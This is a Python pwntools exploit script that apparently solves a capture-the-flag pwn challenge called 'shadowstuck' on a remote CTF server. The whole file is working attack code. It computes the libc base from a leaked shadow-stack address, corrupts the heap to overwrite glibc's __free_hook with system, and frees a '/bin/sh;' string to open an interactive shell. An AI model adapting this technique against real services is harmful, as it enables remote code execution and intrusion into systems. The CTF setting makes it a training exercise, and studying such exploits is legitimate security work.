#!/usr/bin/env python3

from pwn import *

exe = ELF("./shadowstuck")
libc = ELF("./libc-2.31.so")
ld = ELF("./ld-2.31.so")

context.binary = exe


def conn():
        return process(env={"LD_PRELOAD": libc.path})


#r = conn()
r = remote("challenges.ctf.kaf.sh", 8000)

sl = lambda a : r.sendlineafter("> ", a)

def add(name):
    sl("A")
    sl(name)

def fire(name, reason):
    sl("F")
    sl(name)
    if reason:
        r.recvline()
        r.sendline(reason)

def read(idx):
    sl("R")
    sl(str(idx))

def change(idx, data):
    sl("C")
    r.recvline()
    sl(str(idx))
    r.recvline()
    sl(data)

def main():
    r.recvuntil("Shadow stack set up at ")
    LEAK = int(r.recvline().strip(), 16)
    libc.address = LEAK + 0x2000
    log.warn("Libc base @ 0x%x", libc.address)
    
    add("Node0")
    fire("Node0", b"M"*0x10 + p64(libc.sym['__free_hook']-0x8))
    
    change(1, b"/bin/sh;" + p64(libc.sym['system']))
    
    fire(b"/bin/sh;" + p64(libc.sym['system']), "")

    r.interactive()


if __name__ == "__main__":
    main()

